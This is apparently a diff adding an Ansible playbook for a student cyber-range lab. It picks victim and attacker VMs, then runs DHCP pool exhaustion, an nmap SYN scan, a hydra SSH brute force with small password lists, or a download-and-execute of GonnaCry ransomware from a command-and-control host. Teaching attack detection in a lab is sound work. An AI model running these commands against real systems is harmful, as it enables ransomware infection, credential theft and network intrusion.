@@ -1,0 +1,167 @@
+---
+# ── Play 1: Detect clients and set up inventory ─────────────
+- name: Detect active client VMs
+  hosts: localhost
+  gather_facts: false
+  tasks:
+    - name: Query dhcp1 for active leases
+      shell: >
+        ssh -i {{ infra_ssh_private_key_path }}
+        -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null
+        -o ProxyJump=admin@{{ (vms | selectattr('name','equalto','gateway1') | first).wan_ip }}
+        admin@10.10.10.2
+        "awk -F',' 'NR>1 && \$10==\"0\" {print \$1}' /var/lib/kea/kea-leases4.csv"
+      register: lease_output
+      changed_when: false
+
+    - name: Set variables
+      set_fact:
+        client_ips: "{{ lease_output.stdout_lines | default([]) }}"
+        victim_ip: "{{ lease_output.stdout_lines[0] | default('10.10.20.152') }}"
+        attacker_ip: "{{ lease_output.stdout_lines[1] | default(lease_output.stdout_lines[0] | default('10.10.20.153')) }}"
+        attack_type: "{{ attack_type | default('dhcp_exhaustion') }}"
+        student_id: "{{ student_id | default('unknown') }}"
+      cacheable: true
+
+    - name: Show plan
+      debug:
+        msg: "Student={{ student_id }} Attack={{ attack_type }} Victim={{ victim_ip }} Attacker={{ attacker_ip }}"
+
+    - name: Add victim
+      add_host:
+        name: "{{ victim_ip }}"
+        groups: victims
+        ansible_user: "{{ client_user }}"
+        ansible_password: "{{ client_password }}"
+        ansible_ssh_common_args: >-
+          -o ProxyCommand="ssh -i {{ infra_ssh_private_key_path }}
+          -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null
+          -W %h:%p admin@{{ (vms | selectattr('name','equalto','gateway1') | first).wan_ip }}"
+
+    - name: Add attacker
+      add_host:
+        name: "{{ attacker_ip }}"
+        groups: attackers
+        ansible_user: "{{ client_user }}"
+        ansible_password: "{{ client_password }}"
+        ansible_ssh_common_args: >-
+          -o ProxyCommand="ssh -i {{ infra_ssh_private_key_path }}
+          -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null
+          -W %h:%p admin@{{ (vms | selectattr('name','equalto','gateway1') | first).wan_ip }}"
+
+# ── DHCP Exhaustion ──────────────────────────────────────────
+- name: "Attack: DHCP pool exhaustion"
+  hosts: attackers
+  gather_facts: false
+  become: true
+  when: hostvars['localhost']['attack_type'] == 'dhcp_exhaustion'
+  tasks:
+    - name: Run DHCP exhaustion
+      shell: python3 /home/student/attacks/dhcp_exhaustion.py --iface enp1s0 --timeout 3 --max 60
+      register: result
+      timeout: 300
+      ignore_errors: true
+    - name: Output
+      debug:
+        msg: "{{ result.stdout_lines | default(['No output']) }}"
+    - name: Wait for lease flush
+      pause:
+        seconds: 30
+
+# ── GonnaCry Ransomware ──────────────────────────────────────
+- name: "Attack: GonnaCry ransomware"
+  hosts: victims
+  gather_facts: false
+  when: hostvars['localhost']['attack_type'] == 'gonnacry'
+  tasks:
+    - name: Check C2 reachable
+      shell: curl -s --connect-timeout 10 http://173.168.0.50/ > /dev/null 2>&1
+      register: c2_check
+      ignore_errors: true
+    - name: Fail if C2 down
+      fail:
+        msg: "C2 server (173.168.0.50) unreachable. Run configure_c2.yml first."
+      when: c2_check.rc != 0
+    - name: Download and execute GonnaCry
+      shell: >
+        curl -s http://173.168.0.50/download-gonnacry/ -o /tmp/gonnacry
+        && chmod +x /tmp/gonnacry
+        && /tmp/gonnacry
+      register: result
+      timeout: 180
+      ignore_errors: true
+    - name: Output
+      debug:
+        msg: "{{ result.stdout_lines | default(['No output']) }}"
+    - name: Wait for encryption
+      pause:
+        seconds: 120
+        prompt: "Waiting 2 min for AES-256-GCM file encryption..."
+    - name: Check ransom note
+      shell: cat ~/RANSOM_NOTE.txt 2>/dev/null || echo 'No ransom note found'
+      register: ransom
+    - name: Show ransom note
+      debug:
+        msg: "{{ ransom.stdout_lines }}"
+
+# ── Nmap Scan ────────────────────────────────────────────────
+- name: "Attack: Nmap reconnaissance"
+  hosts: attackers
+  gather_facts: false
+  become: true
+  when: hostvars['localhost']['attack_type'] == 'nmap_scan'
+  tasks:
+    - name: Install nmap
+      apt:
+        name: nmap
+        state: present
+      ignore_errors: true
+    - name: Run SYN scan
+      shell: nmap -sS -T4 -p 22,53,67,68,80,443,445,3306 10.10.10.0/24 10.10.20.0/24 -oN /tmp/nmap_results.txt 2>&1
+      register: result
+      timeout: 300
+      ignore_errors: true
+    - name: Output
+      debug:
+        msg: "{{ result.stdout_lines | default(['No output']) }}"
+
+# ── SSH Brute Force ──────────────────────────────────────────
+- name: "Attack: SSH brute force"
+  hosts: attackers
+  gather_facts: false
+  become: true
+  when: hostvars['localhost']['attack_type'] == 'ssh_brute_force'
+  vars:
+    victim_ip: "{{ hostvars['localhost']['victim_ip'] }}"
+  tasks:
+    - name: Install hydra
+      apt:
+        name: hydra
+        state: present
+      ignore_errors: true
+    - name: Create wordlists
+      shell: |
+        printf 'admin\nroot\nstudent\nubuntu\nuser\n' > /tmp/users.txt
+        printf 'admin\npassword\n123456\nstudent\nubuntu\nletmein\ntoor\n' > /tmp/passes.txt
+    - name: Run hydra
+      shell: hydra -L /tmp/users.txt -P /tmp/passes.txt -t 4 -f -o /tmp/hydra_results.txt ssh://{{ victim_ip }} 2>&1
+      register: result
+      timeout: 300
+      ignore_errors: true
+    - name: Output
+      debug:
+        msg: "{{ result.stdout_lines | default(['No output']) }}"
+
+# ── Summary ──────────────────────────────────────────────────
+- name: Attack complete
+  hosts: localhost
+  gather_facts: true
+  tasks:
+    - name: Summary
+      debug:
+        msg: |
+          ════════════════════════════════════════════════
+          Attack complete: {{ attack_type }}
+          Student: {{ student_id }}
+          Logs will be collected in the next step.
+          ════════════════════════════════════════════════
